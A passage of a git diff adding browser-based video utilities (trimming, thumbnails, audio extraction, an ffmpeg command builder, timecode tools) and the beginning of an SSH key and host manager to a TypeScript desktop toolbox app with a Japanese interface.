+  const setA = document.getElementById(
+    "vidstd-set-a",
+  ) as HTMLButtonElement | null;
+  const setB = document.getElementById(
+    "vidstd-set-b",
+  ) as HTMLButtonElement | null;
+  const abEl = document.getElementById("vidstd-ab");
+  const loopEl = document.getElementById(
+    "vidstd-loop",
+  ) as HTMLInputElement | null;
+  const fpsEl = document.getElementById(
+    "vidstd-fps",
+  ) as HTMLInputElement | null;
+  const guideEl = document.getElementById(
+    "vidstd-guide",
+  ) as HTMLSelectElement | null;
+  const snapBtn = document.getElementById(
+    "vidstd-snap",
+  ) as HTMLButtonElement | null;
+  const overlay = document.getElementById(
+    "vidstd-overlay",
+  ) as HTMLCanvasElement | null;
+  if (!fileEl || !video) return;
+
+  fileEl.addEventListener("change", () => {
+    const f = fileEl.files?.[0];
+    if (!f) return;
+    if (video.src) URL.revokeObjectURL(video.src);
+    video.src = URL.createObjectURL(f);
+    vidStdAB = { a: null, b: null };
+    if (abEl) abEl.textContent = "A:- B:-";
+  });
+  video.addEventListener("loadedmetadata", () => {
+    if (metaEl) {
+      metaEl.textContent = `${video.videoWidth}×${video.videoHeight} / 長さ ${video.duration.toFixed(2)}秒`;
+    }
+    drawGuide();
+  });
+  rateEl?.addEventListener("change", () => {
+    video.playbackRate = parseFloat(rateEl.value);
+  });
+  const fps = (): number => Math.max(1, parseInt(fpsEl?.value || "30", 10));
+  stepBack?.addEventListener("click", () => {
+    video.pause();
+    video.currentTime = Math.max(0, video.currentTime - 1 / fps());
+  });
+  stepFwd?.addEventListener("click", () => {
+    video.pause();
+    video.currentTime = Math.min(video.duration, video.currentTime + 1 / fps());
+  });
+  setA?.addEventListener("click", () => {
+    vidStdAB.a = video.currentTime;
+    if (abEl)
+      abEl.textContent = `A:${vidStdAB.a.toFixed(2)} B:${vidStdAB.b?.toFixed(2) ?? "-"}`;
+  });
+  setB?.addEventListener("click", () => {
+    vidStdAB.b = video.currentTime;
+    if (abEl)
+      abEl.textContent = `A:${vidStdAB.a?.toFixed(2) ?? "-"} B:${vidStdAB.b.toFixed(2)}`;
+  });
+  video.addEventListener("timeupdate", () => {
+    if (
+      loopEl?.checked &&
+      vidStdAB.a !== null &&
+      vidStdAB.b !== null &&
+      vidStdAB.b > vidStdAB.a
+    ) {
+      if (video.currentTime >= vidStdAB.b) video.currentTime = vidStdAB.a;
+      else if (video.currentTime < vidStdAB.a) video.currentTime = vidStdAB.a;
+    }
+  });
+  snapBtn?.addEventListener("click", () => {
+    if (!video.videoWidth) return;
+    const c = document.createElement("canvas");
+    c.width = video.videoWidth;
+    c.height = video.videoHeight;
+    const ctx = c.getContext("2d");
+    if (!ctx) return;
+    ctx.drawImage(video, 0, 0);
+    downloadCanvas(
+      c,
+      "image/png",
+      1,
+      `frame_${video.currentTime.toFixed(2)}s.png`,
+    );
+  });
+
+  const drawGuide = (): void => {
+    if (!overlay || !video.videoWidth) return;
+    const g = guideEl?.value || "";
+    if (!g) {
+      overlay.style.display = "none";
+      return;
+    }
+    overlay.style.display = "block";
+    const w = video.videoWidth,
+      h = video.videoHeight;
+    overlay.width = w;
+    overlay.height = h;
+    const ctx = overlay.getContext("2d");
+    if (!ctx) return;
+    ctx.clearRect(0, 0, w, h);
+    ctx.fillStyle = "rgba(0,0,0,0.5)";
+    const [rwS, rhS] = g.split(":");
+    const rw = parseInt(rwS, 10),
+      rh = parseInt(rhS, 10);
+    const sAr = w / h,
+      dAr = rw / rh;
+    if (dAr > sAr) {
+      // letterbox top/bottom
+      const safeH = w / dAr;
+      const bar = (h - safeH) / 2;
+      ctx.fillRect(0, 0, w, bar);
+      ctx.fillRect(0, h - bar, w, bar);
+    } else {
+      const safeW = h * dAr;
+      const bar = (w - safeW) / 2;
+      ctx.fillRect(0, 0, bar, h);
+      ctx.fillRect(w - bar, 0, bar, h);
+    }
+    ctx.strokeStyle = "rgba(255,255,255,0.6)";
+    ctx.lineWidth = Math.max(1, w / 400);
+    ctx.strokeRect(0.5, 0.5, w - 1, h - 1);
+  };
+  guideEl?.addEventListener("change", drawGuide);
+}
+
+function getVidStdVideo(): HTMLVideoElement | null {
+  return document.getElementById("vidstd-video") as HTMLVideoElement | null;
+}
+
+function setupVidStdThumbs(): void {
+  const nEl = document.getElementById(
+    "vidstd-thumb-n",
+  ) as HTMLInputElement | null;
+  const wEl = document.getElementById(
+    "vidstd-thumb-w",
+  ) as HTMLInputElement | null;
+  const runBtn = document.getElementById(
+    "vidstd-thumb-run",
+  ) as HTMLButtonElement | null;
+  const outEl = document.getElementById("vidstd-thumb-out");
+  if (!runBtn || !outEl) return;
+  runBtn.addEventListener("click", async () => {
+    const video = getVidStdVideo();
+    if (!video || !video.videoWidth) {
+      outEl.textContent = "先に動画を読み込んでください";
+      return;
+    }
+    const n = Math.max(1, Math.min(64, parseInt(nEl?.value || "9", 10)));
+    const tw = Math.max(32, parseInt(wEl?.value || "320", 10));
+    const th = Math.round((tw * video.videoHeight) / video.videoWidth);
+    outEl.innerHTML = "";
+    const dur = video.duration;
+    const wasPaused = video.paused;
+    video.pause();
+    for (let i = 0; i < n; i++) {
+      const t = (dur * (i + 0.5)) / n;
+      await new Promise<void>((resolve) => {
+        const onSeek = (): void => {
+          video.removeEventListener("seeked", onSeek);
+          resolve();
+        };
+        video.addEventListener("seeked", onSeek);
+        video.currentTime = t;
+      });
+      const c = document.createElement("canvas");
+      c.width = tw;
+      c.height = th;
+      const ctx = c.getContext("2d");
+      if (ctx) ctx.drawImage(video, 0, 0, tw, th);
+      const wrap = document.createElement("div");
+      wrap.style.cssText =
+        "display:flex;flex-direction:column;align-items:center;gap:2px;font-size:11px;opacity:0.85";
+      wrap.appendChild(c);
+      const label = document.createElement("span");
+      label.textContent = `${t.toFixed(2)}s`;
+      wrap.appendChild(label);
+      const btn = document.createElement("button");
+      btn.type = "button";
+      btn.className = "toolbox-secondary";
+      btn.textContent = "DL";
+      btn.addEventListener("click", () =>
+        downloadCanvas(c, "image/png", 1, `thumb_${t.toFixed(2)}s.png`),
+      );
+      wrap.appendChild(btn);
+      outEl.appendChild(wrap);
+    }
+    if (!wasPaused) video.play().catch(() => {});
+  });
+}
+
+function setupVidStdTrim(): void {
+  const muteEl = document.getElementById(
+    "vidstd-trim-mute",
+  ) as HTMLInputElement | null;
+  const runBtn = document.getElementById(
+    "vidstd-trim-run",
+  ) as HTMLButtonElement | null;
+  const dlBtn = document.getElementById(
+    "vidstd-trim-dl",
+  ) as HTMLButtonElement | null;
+  const statusEl = document.getElementById("vidstd-trim-status");
+  if (!runBtn || !dlBtn) return;
+  runBtn.addEventListener("click", async () => {
+    const video = getVidStdVideo();
+    if (!video || !video.videoWidth) {
+      if (statusEl) statusEl.textContent = "動画を読み込んでください";
+      return;
+    }
+    if (
+      vidStdAB.a === null ||
+      vidStdAB.b === null ||
+      vidStdAB.b <= vidStdAB.a
+    ) {
+      if (statusEl) statusEl.textContent = "①で A/B 区間を設定してください";
+      return;
+    }
+    const captureFn = (
+      video as unknown as { captureStream?: () => MediaStream }
+    ).captureStream;
+    if (!captureFn) {
+      if (statusEl) statusEl.textContent = "captureStream 非対応のブラウザです";
+      return;
+    }
+    const stream = captureFn.call(video);
+    if (muteEl?.checked) {
+      stream
+        .getAudioTracks()
+        .forEach((t: MediaStreamTrack) => stream.removeTrack(t));
+    }
+    const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")
+      ? "video/webm;codecs=vp9,opus"
+      : "video/webm";
+    const chunks: Blob[] = [];
+    const rec = new MediaRecorder(stream, { mimeType: mime });
+    rec.ondataavailable = (e) => {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+    rec.onstop = () => {
+      if (vidStdTrimUrl) URL.revokeObjectURL(vidStdTrimUrl);
+      const blob = new Blob(chunks, { type: mime });
+      vidStdTrimUrl = URL.createObjectURL(blob);
+      dlBtn.disabled = false;
+      if (statusEl)
+        statusEl.textContent = `完了 ${(blob.size / 1024 / 1024).toFixed(2)} MB`;
+    };
+    if (statusEl) statusEl.textContent = "録画中…";
+    video.pause();
+    video.currentTime = vidStdAB.a;
+    await new Promise<void>((r) => {
+      const on = (): void => {
+        video.removeEventListener("seeked", on);
+        r();
+      };
+      video.addEventListener("seeked", on);
+    });
+    rec.start();
+    await video.play();
+    const stopAt = vidStdAB.b;
+    const tick = (): void => {
+      if (video.currentTime >= stopAt) {
+        video.pause();
+        rec.stop();
+      } else {
+        requestAnimationFrame(tick);
+      }
+    };
+    requestAnimationFrame(tick);
+  });
+  dlBtn.addEventListener("click", () => {
+    if (!vidStdTrimUrl) return;
+    const a = document.createElement("a");
+    a.href = vidStdTrimUrl;
+    a.download = "trimmed.webm";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+  });
+}
+
+function setupVidStdAudio(): void {
+  const runBtn = document.getElementById(
+    "vidstd-aud-run",
+  ) as HTMLButtonElement | null;
+  const dlBtn = document.getElementById(
+    "vidstd-aud-dl",
+  ) as HTMLButtonElement | null;
+  const statusEl = document.getElementById("vidstd-aud-status");
+  if (!runBtn || !dlBtn) return;
+  runBtn.addEventListener("click", async () => {
+    const video = getVidStdVideo();
+    if (!video || !video.videoWidth) {
+      if (statusEl) statusEl.textContent = "動画を読み込んでください";
+      return;
+    }
+    const captureFn = (
+      video as unknown as { captureStream?: () => MediaStream }
+    ).captureStream;
+    if (!captureFn) {
+      if (statusEl) statusEl.textContent = "captureStream 非対応";
+      return;
+    }
+    const stream: MediaStream = captureFn.call(video);
+    const audioTracks = stream.getAudioTracks();
+    if (audioTracks.length === 0) {
+      if (statusEl) statusEl.textContent = "音声トラックがありません";
+      return;
+    }
+    const audioStream = new MediaStream(audioTracks);
+    const mime = MediaRecorder.isTypeSupported("audio/webm;codecs=opus")
+      ? "audio/webm;codecs=opus"
+      : "audio/webm";
+    const chunks: Blob[] = [];
+    const rec = new MediaRecorder(audioStream, { mimeType: mime });
+    rec.ondataavailable = (e) => {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+    rec.onstop = () => {
+      if (vidStdAudUrl) URL.revokeObjectURL(vidStdAudUrl);
+      const blob = new Blob(chunks, { type: mime });
+      vidStdAudUrl = URL.createObjectURL(blob);
+      dlBtn.disabled = false;
+      if (statusEl)
+        statusEl.textContent = `完了 ${(blob.size / 1024).toFixed(1)} KB`;
+    };
+    video.pause();
+    video.currentTime = 0;
+    await new Promise<void>((r) => {
+      const on = (): void => {
+        video.removeEventListener("seeked", on);
+        r();
+      };
+      video.addEventListener("seeked", on);
+    });
+    if (statusEl) statusEl.textContent = "抽出中…";
+    rec.start();
+    await video.play();
+    const stopAt = video.duration;
+    const tick = (): void => {
+      if (video.currentTime >= stopAt - 0.05 || video.ended) {
+        video.pause();
+        rec.stop();
+      } else {
+        requestAnimationFrame(tick);
+      }
+    };
+    requestAnimationFrame(tick);
+  });
+  dlBtn.addEventListener("click", () => {
+    if (!vidStdAudUrl) return;
+    const a = document.createElement("a");
+    a.href = vidStdAudUrl;
+    a.download = "audio.webm";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+  });
+}
+
+function setupVidStdRecorder(): void {
+  const startBtn = document.getElementById(
+    "vidstd-rec-start",
+  ) as HTMLButtonElement | null;
+  const stopBtn = document.getElementById(
+    "vidstd-rec-stop",
+  ) as HTMLButtonElement | null;
+  const dlBtn = document.getElementById(
+    "vidstd-rec-dl",
+  ) as HTMLButtonElement | null;
+  const timeEl = document.getElementById("vidstd-rec-time");
+  const audioEl = document.getElementById(
+    "vidstd-rec-audio",
+  ) as HTMLAudioElement | null;
+  if (!startBtn || !stopBtn || !dlBtn) return;
+  startBtn.addEventListener("click", async () => {
+    try {
+      vidStdRecStream = await navigator.mediaDevices.getUserMedia({
+        audio: true,
+      });
+    } catch (e) {
+      if (timeEl) timeEl.textContent = "マイク取得失敗: " + String(e);
+      return;
+    }
+    const mime = MediaRecorder.isTypeSupported("audio/webm;codecs=opus")
+      ? "audio/webm;codecs=opus"
+      : "audio/webm";
+    vidStdRecChunks = [];
+    vidStdRecorder = new MediaRecorder(vidStdRecStream, { mimeType: mime });
+    vidStdRecorder.ondataavailable = (e) => {
+      if (e.data.size > 0) vidStdRecChunks.push(e.data);
+    };
+    vidStdRecorder.onstop = () => {
+      if (vidStdRecUrl) URL.revokeObjectURL(vidStdRecUrl);
+      const blob = new Blob(vidStdRecChunks, { type: mime });
+      vidStdRecUrl = URL.createObjectURL(blob);
+      if (audioEl) {
+        audioEl.src = vidStdRecUrl;
+        audioEl.style.display = "block";
+      }
+      dlBtn.disabled = false;
+      vidStdRecStream?.getTracks().forEach((t) => t.stop());
+      vidStdRecStream = null;
+      if (vidStdRecTimer !== null) {
+        clearInterval(vidStdRecTimer);
+        vidStdRecTimer = null;
+      }
+    };
+    vidStdRecorder.start();
+    vidStdRecStart = Date.now();
+    startBtn.disabled = true;
+    stopBtn.disabled = false;
+    vidStdRecTimer = window.setInterval(() => {
+      const s = Math.floor((Date.now() - vidStdRecStart) / 1000);
+      const m = Math.floor(s / 60);
+      const ss = s % 60;
+      if (timeEl)
+        timeEl.textContent = `${String(m).padStart(2, "0")}:${String(ss).padStart(2, "0")}`;
+    }, 250);
+  });
+  stopBtn.addEventListener("click", () => {
+    vidStdRecorder?.stop();
+    vidStdRecorder = null;
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+  });
+  dlBtn.addEventListener("click", () => {
+    if (!vidStdRecUrl) return;
+    const a = document.createElement("a");
+    a.href = vidStdRecUrl;
+    a.download = "recording.webm";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+  });
+}
+
+function setupVidStdFFmpegBuilder(): void {
+  const inEl = document.getElementById("ffb-in") as HTMLInputElement | null;
+  const outEl = document.getElementById("ffb-out") as HTMLInputElement | null;
+  const ssEl = document.getElementById("ffb-ss") as HTMLInputElement | null;
+  const tEl = document.getElementById("ffb-t") as HTMLInputElement | null;
+  const scaleEl = document.getElementById(
+    "ffb-scale",
+  ) as HTMLInputElement | null;
+  const cropEl = document.getElementById("ffb-crop") as HTMLInputElement | null;
+  const fpsEl = document.getElementById("ffb-fps") as HTMLInputElement | null;
+  const muteEl = document.getElementById("ffb-mute") as HTMLInputElement | null;
+  const copyEl = document.getElementById("ffb-copy") as HTMLInputElement | null;
+  const presetEl = document.getElementById(
+    "ffb-preset",
+  ) as HTMLSelectElement | null;
+  const buildBtn = document.getElementById(
+    "ffb-build",
+  ) as HTMLButtonElement | null;
+  const copyBtn = document.getElementById(
+    "ffb-copybtn",
+  ) as HTMLButtonElement | null;
+  const cmdEl = document.getElementById("ffb-out-cmd");
+  if (!buildBtn || !cmdEl) return;
+
+  const build = (): string => {
+    const input = inEl?.value || "input.mp4";
+    let output = outEl?.value || "output.mp4";
+    const parts: string[] = ["ffmpeg", "-y"];
+    if (ssEl?.value) parts.push("-ss", ssEl.value);
+    parts.push("-i", `"${input}"`);
+    if (tEl?.value) parts.push("-t", tEl.value);
+    const preset = presetEl?.value || "custom";
+    const filters: string[] = [];
+    if (scaleEl?.value) filters.push(`scale=${scaleEl.value}`);
+    if (cropEl?.value) filters.push(`crop=${cropEl.value}`);
+    if (fpsEl?.value) filters.push(`fps=${fpsEl.value}`);
+
+    if (preset === "gif") {
+      output = output.replace(/\.[a-z0-9]+$/i, "") + ".gif";
+      const f = filters.length ? filters.join(",") + "," : "";
+      parts.push(
+        "-vf",
+        `"${f}split[s0][s1];[s0]palettegen[p];[s1][p]paletteuse"`,
+      );
+      parts.push(`"${output}"`);
+    } else if (preset === "audio") {
+      output = output.replace(/\.[a-z0-9]+$/i, "") + ".mp3";
+      parts.push("-vn", "-c:a", "libmp3lame", "-q:a", "2", `"${output}"`);
+    } else {
+      let resolved = filters;
+      if (preset === "reels")
+        resolved = [
+          ...filters,
+          "scale=1080:1920:force_original_aspect_ratio=decrease,pad=1080:1920:(ow-iw)/2:(oh-ih)/2:black",
+        ];
+      else if (preset === "square")
+        resolved = [
+          ...filters,
+          "scale=1080:1080:force_original_aspect_ratio=decrease,pad=1080:1080:(ow-iw)/2:(oh-ih)/2:black",
+        ];
+      else if (preset === "yt1080")
+        resolved = [
+          ...filters,
+          "scale=1920:1080:force_original_aspect_ratio=decrease,pad=1920:1080:(ow-iw)/2:(oh-ih)/2:black",
+        ];
+      if (resolved.length) parts.push("-vf", `"${resolved.join(",")}"`);
+      if (copyEl?.checked) parts.push("-c", "copy");
+      else
+        parts.push(
+          "-c:v",
+          "libx264",
+          "-preset",
+          "medium",
+          "-crf",
+          "23",
+          "-pix_fmt",
+          "yuv420p",
+        );
+      if (muteEl?.checked) parts.push("-an");
+      else if (!copyEl?.checked) parts.push("-c:a", "aac", "-b:a", "192k");
+      parts.push(`"${output}"`);
+    }
+    return parts.join(" ");
+  };
+
+  buildBtn.addEventListener("click", () => {
+    cmdEl.textContent = build();
+  });
+  copyBtn?.addEventListener("click", () => {
+    const txt = cmdEl.textContent || "";
+    if (txt) navigator.clipboard.writeText(txt);
+  });
+}
+
+function setupVidStdTimecode(): void {
+  const secEl = document.getElementById(
+    "vidstd-tc-sec",
+  ) as HTMLInputElement | null;
+  const hmsEl = document.getElementById(
+    "vidstd-tc-hms",
+  ) as HTMLInputElement | null;
+  const frameEl = document.getElementById(
+    "vidstd-tc-frame",
+  ) as HTMLInputElement | null;
+  const fpsEl = document.getElementById(
+    "vidstd-tc-fps",
+  ) as HTMLInputElement | null;
+  if (!secEl || !hmsEl || !frameEl || !fpsEl) return;
+
+  const fmtHMS = (s: number): string => {
+    if (!isFinite(s) || s < 0) return "";
+    const h = Math.floor(s / 3600);
+    const m = Math.floor((s % 3600) / 60);
+    const sec = s - h * 3600 - m * 60;
+    return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${sec.toFixed(3).padStart(6, "0")}`;
+  };
+  const parseHMS = (str: string): number => {
+    const m = str.trim().match(/^(?:(\d+):)?(?:(\d+):)?([\d.]+)$/);
+    if (!m) return NaN;
+    const a = m[1] ? parseInt(m[1], 10) : 0;
+    const b = m[2] ? parseInt(m[2], 10) : 0;
+    const c = parseFloat(m[3]);
+    if (m[1] && m[2]) return a * 3600 + b * 60 + c;
+    if (m[1] && !m[2]) return a * 60 + c;
+    return c;
+  };
+  const fps = (): number => Math.max(1, parseFloat(fpsEl.value || "30"));
+
+  let updating = false;
+  const fromSec = (s: number): void => {
+    if (updating) return;
+    updating = true;
+    hmsEl.value = fmtHMS(s);
+    frameEl.value = String(Math.round(s * fps()));
+    updating = false;
+  };
+  secEl.addEventListener("input", () => {
+    const s = parseFloat(secEl.value);
+    if (!isNaN(s)) fromSec(s);
+  });
+  hmsEl.addEventListener("input", () => {
+    if (updating) return;
+    const s = parseHMS(hmsEl.value);
+    if (!isNaN(s)) {
+      updating = true;
+      secEl.value = String(s);
+      frameEl.value = String(Math.round(s * fps()));
+      updating = false;
+    }
+  });
+  frameEl.addEventListener("input", () => {
+    if (updating) return;
+    const f = parseInt(frameEl.value, 10);
+    if (!isNaN(f)) {
+      const s = f / fps();
+      updating = true;
+      secEl.value = String(s);
+      hmsEl.value = fmtHMS(s);
+      updating = false;
+    }
+  });
+  fpsEl.addEventListener("input", () => {
+    const s = parseFloat(secEl.value);
+    if (!isNaN(s)) fromSec(s);
+  });
+}
+
+function setupVidStdAspect(): void {
+  const wEl = document.getElementById("vidstd-ar-w") as HTMLInputElement | null;
+  const hEl = document.getElementById("vidstd-ar-h") as HTMLInputElement | null;
+  const runBtn = document.getElementById(
+    "vidstd-ar-run",
+  ) as HTMLButtonElement | null;
+  const outEl = document.getElementById("vidstd-ar-out");
+  if (!wEl || !hEl || !runBtn || !outEl) return;
+  const gcd = (a: number, b: number): number => (b === 0 ? a : gcd(b, a % b));
+  runBtn.addEventListener("click", () => {
+    const w = parseInt(wEl.value, 10);
+    const h = parseInt(hEl.value, 10);
+    if (!w || !h) {
+      outEl.textContent = "幅と高さを入力してください";
+      return;
+    }
+    const g = gcd(w, h);
+    const ratio = `${w / g}:${h / g}`;
+    const decimal = (w / h).toFixed(4);
+    const presets: Array<[string, number]> = [
+      ["16:9", 16 / 9],
+      ["4:3", 4 / 3],
+      ["1:1", 1],
+      ["9:16", 9 / 16],
+      ["4:5", 4 / 5],
+      ["3:2", 3 / 2],
+      ["21:9", 21 / 9],
+      ["2.35:1", 2.35],
+    ];
+    let near = presets[0];
+    let nearDiff = Infinity;
+    for (const p of presets) {
+      const d = Math.abs(p[1] - w / h);
+      if (d < nearDiff) {
+        nearDiff = d;
+        near = p;
+      }
+    }
+    const lines = [
+      `アスペクト比 : ${ratio}`,
+      `小数         : ${decimal}`,
+      `最寄り規格   : ${near[0]} (差 ${(nearDiff * 100).toFixed(2)}%)`,
+      ``,
+      `--- 同比のスケール候補 ---`,
+      ...[480, 720, 1080, 1440, 2160].map((targetH) => {
+        const tw = Math.round((w / h) * targetH);
+        return `${targetH}p : ${tw}×${targetH}`;
+      }),
+    ];
+    outEl.textContent = lines.join("\n");
+  });
 }
 
 function setupSpeedtestTool(): void {
@@ -10346,4 +13784,1429 @@ function setupTerminalTool(): void {
   ansiStrip.addEventListener("change", renderOutput);
   renderTabs();
   renderOutput();
+}
+
+// ===== 🔐 SSH 接続 =====
+
+interface SshKeyInfo {
+  name: string;
+  private_path: string;
+  public_path: string;
+  has_private: boolean;
+  has_public: boolean;
+  key_type: string;
+  comment: string;
+  fingerprint: string;
+}
+
+interface SshHostEntry {
+  alias: string;
+  hostname: string;
+  user: string;
+  port: number;
+  identity_file: string;
+  extra: string;
+}
+
+interface SshSession {
+  id: number;
+  label: string;
+  output: string;
+  alive: boolean;
+}
+
+let sshSessions: SshSession[] = [];
+let sshActive: number | null = null;
+let sshListenerInstalled = false;
+let sshKeysCache: SshKeyInfo[] = [];
+
+function setupSshTool(): void {
+  const out = document.getElementById("ssh-output") as HTMLPreElement | null;
+  if (!out) return;
+  const tabs = document.getElementById("ssh-tabs") as HTMLDivElement;
+  const inputEl = document.getElementById("ssh-input") as HTMLInputElement;
+  const status = document.getElementById("ssh-status") as HTMLSpanElement;
+  const qTarget = document.getElementById("ssh-q-target") as HTMLInputElement;
+  const qPort = document.getElementById("ssh-q-port") as HTMLInputElement;
+  const qKey = document.getElementById("ssh-q-key") as HTMLSelectElement;
+  const qStrict = document.getElementById("ssh-q-strict") as HTMLInputElement;
+  const qVerbose = document.getElementById("ssh-q-verbose") as HTMLInputElement;
+  const hostList = document.getElementById("ssh-host-list") as HTMLDivElement;
+  const keyList = document.getElementById("ssh-key-list") as HTMLDivElement;
+  const hAlias = document.getElementById("ssh-h-alias") as HTMLInputElement;
+  const hHost = document.getElementById("ssh-h-host") as HTMLInputElement;
+  const hUser = document.getElementById("ssh-h-user") as HTMLInputElement;
+  const hPort = document.getElementById("ssh-h-port") as HTMLInputElement;
+  const hKey = document.getElementById("ssh-h-key") as HTMLSelectElement;
+  const kName = document.getElementById("ssh-k-name") as HTMLInputElement;
+  const kType = document.getElementById("ssh-k-type") as HTMLSelectElement;
+  const kComment = document.getElementById("ssh-k-comment") as HTMLInputElement;
+  const impName = document.getElementById("ssh-imp-name") as HTMLInputElement;
+  const impPriv = document.getElementById(
+    "ssh-imp-priv",
+  ) as HTMLTextAreaElement;
+  const impPub = document.getElementById("ssh-imp-pub") as HTMLTextAreaElement;
+
+  function setStatus(msg: string, error = false): void {
+    if (!status) return;
+    status.textContent = msg;
+    status.style.color = error ? "#ff7676" : "";
+  }
+
+  function getActive(): SshSession | null {
+    if (sshActive == null) return null;
+    return sshSessions.find((s) => s.id === sshActive) ?? null;
+  }
+  function renderTabs(): void {
+    tabs.textContent = "";
+    for (const s of sshSessions) {
+      const div = document.createElement("div");
+      div.className = "tm-tab" + (s.id === sshActive ? " active" : "");
+      div.textContent = `${s.label} #${s.id}` + (s.alive ? "" : " [終了]");
+      div.addEventListener("click", () => {
+        sshActive = s.id;
+        renderTabs();
+        renderOutput();
+      });
+      const close = document.createElement("span");
+      close.className = "tm-tab-close";
+      close.textContent = "✖";
+      close.addEventListener("click", (e) => {
+        e.stopPropagation();
+        if (s.alive)
+          invoke("terminal_kill", { sessionId: s.id }).catch(() => undefined);
+        sshSessions = sshSessions.filter((x) => x.id !== s.id);
+        if (sshActive === s.id) sshActive = sshSessions[0]?.id ?? null;
+        renderTabs();
+        renderOutput();
+      });
+      div.appendChild(close);
+      tabs.appendChild(div);
+    }
+  }
+  function renderOutput(): void {
+    const s = getActive();
+    if (!s) {
+      out!.textContent =
+        "(未接続 — 上のクイック接続またはホスト一覧から接続してください)";
+      return;
+    }
+    out!.textContent = s.output;
+    out!.scrollTop = out!.scrollHeight;
+  }
+
+  if (!sshListenerInstalled) {
+    sshListenerInstalled = true;
+    listen<{ session_id: number; stream: string; data: string }>(
+      "terminal-output",
+      (ev) => {
+        const sess = sshSessions.find((s) => s.id === ev.payload.session_id);
+        if (!sess) return;
+        sess.output += ev.payload.data;
+        if (sess.output.length > 500_000)
+          sess.output = sess.output.slice(-400_000);
+        if (sess.id === sshActive) renderOutput();
+      },
+    ).catch(() => undefined);
+    listen<{ session_id: number; code: number | null }>(
+      "terminal-exit",
+      (ev) => {
+        const sess = sshSessions.find((s) => s.id === ev.payload.session_id);
+        if (!sess) return;
+        sess.alive = false;
+        sess.output += `\n[セッション終了 (code=${ev.payload.code ?? "?"})]\n`;
+        renderTabs();
+        if (sess.id === sshActive) renderOutput();
+      },
+    ).catch(() => undefined);
+  }
+
+  function fillKeySelect(
+    sel: HTMLSelectElement,
+    allowEmpty: boolean,
+    emptyLabel: string,
+  ): void {
+    const prev = sel.value;
+    sel.textContent = "";
+    if (allowEmpty) {
+      const o = document.createElement("option");
+      o.value = "";
+      o.textContent = emptyLabel;
+      sel.appendChild(o);
+    }
+    for (const k of sshKeysCache) {
+      if (!k.has_private) continue;
+      const o = document.createElement("option");
+      o.value = k.private_path;
+      o.textContent = `${k.name}${k.key_type ? ` (${k.key_type})` : ""}`;
+      sel.appendChild(o);
+    }
+    sel.value = prev;
+  }
+
+  async function refreshKeys(): Promise<void> {
+    try {
+      sshKeysCache = await invoke<SshKeyInfo[]>("ssh_list_keys");
+    } catch (e) {
+      setStatus(`鍵一覧取得失敗: ${String(e)}`, true);
+      sshKeysCache = [];
+    }
+    fillKeySelect(qKey, true, "(鍵を指定しない)");
+    fillKeySelect(hKey, true, "(指定なし)");
+    renderKeyList();
+  }
+
+  function renderKeyList(): void {
+    keyList.textContent = "";
+    if (sshKeysCache.length === 0) {
+      const div = document.createElement("div");
+      div.className = "toolbox-note";
+      div.textContent =
+        "登録された SSH 鍵はありません。下のフォームから生成 / インポートしてください。";
+      keyList.appendChild(div);
+      return;
+    }
+    for (const k of sshKeysCache) {
+      const card = document.createElement("div");
+      card.style.cssText =
+        "border:1px solid #2c2c2c;border-radius:6px;padding:8px 10px;background:#1e1e1e;color:#e0e0e0;display:flex;flex-wrap:wrap;gap:8px;align-items:center";
+      const main = document.createElement("div");
+      main.style.cssText = "flex:1;min-width:18em";
+      main.innerHTML =
+        `<div style="font-weight:bold">${escapeHtml(k.name)} ` +
+        `<span style="font-weight:normal;color:#9e9e9e;font-size:11px">` +
+        `${escapeHtml(k.key_type || "?")}${k.comment ? " · " + escapeHtml(k.comment) : ""}` +
+        `</span></div>` +
+        (k.fingerprint
+          ? `<div style="font-family:monospace;font-size:11px;color:#9e9e9e">${escapeHtml(k.fingerprint)}</div>`
+          : "") +
+        `<div style="font-size:11px;color:#9e9e9e">priv: ${escapeHtml(k.private_path)}` +
+        (k.has_public
+          ? ""
+          : "  <span style='color:#ff9d3a'>(.pub なし)</span>") +
+        `</div>`;
+      card.appendChild(main);
+
+      const copyBtn = document.createElement("button");
+      copyBtn.type = "button";
+      copyBtn.textContent = "📋 公開鍵コピー";
+      copyBtn.disabled = !k.has_public;
+      copyBtn.addEventListener("click", async () => {
+        try {
+          const t = await invoke<string>("ssh_read_pubkey", { name: k.name });
+          await navigator.clipboard.writeText(t);
+          setStatus(`公開鍵をクリップボードにコピーしました: ${k.name}`);
+        } catch (e) {
+          setStatus(`コピー失敗: ${String(e)}`, true);
+        }
+      });
+      card.appendChild(copyBtn);
+
+      const delBtn = document.createElement("button");
+      delBtn.type = "button";
+      delBtn.textContent = "🗑 削除";
+      delBtn.addEventListener("click", async () => {
+        if (!confirm(`鍵 ${k.name} を削除します。よろしいですか？`)) return;
+        try {
+          await invoke("ssh_delete_key", { name: k.name });
+          setStatus(`削除しました: ${k.name}`);
+          await refreshKeys();
+        } catch (e) {
+          setStatus(`削除失敗: ${String(e)}`, true);
+        }
+      });
+      card.appendChild(delBtn);
+      keyList.appendChild(card);
+    }
+  }
+
+  async function refreshHosts(): Promise<void> {
+    try {
+      const hosts = await invoke<SshHostEntry[]>("ssh_list_hosts");
+      renderHostList(hosts);
+    } catch (e) {
+      setStatus(`ホスト一覧取得失敗: ${String(e)}`, true);
+    }
+  }
+
+  function renderHostList(hosts: SshHostEntry[]): void {
+    hostList.textContent = "";
+    if (hosts.length === 0) {
+      const div = document.createElement("div");
+      div.className = "toolbox-note";
+      div.textContent =
+        "登録された接続先はありません。下のフォームから追加してください。";
+      hostList.appendChild(div);
+      return;
+    }
+    for (const h of hosts) {
+      const card = document.createElement("div");
+      card.style.cssText =
+        "border:1px solid #2c2c2c;border-radius:6px;padding:8px 10px;background:#1e1e1e;color:#e0e0e0;display:flex;flex-wrap:wrap;gap:8px;align-items:center";
+      const main = document.createElement("div");
+      main.style.cssText = "flex:1;min-width:18em";
+      const target =
+        (h.user ? h.user + "@" : "") +
+        (h.hostname || "?") +
+        (h.port && h.port !== 22 ? ":" + h.port : "");
+      main.innerHTML =
+        `<div style="font-weight:bold">${escapeHtml(h.alias)} ` +
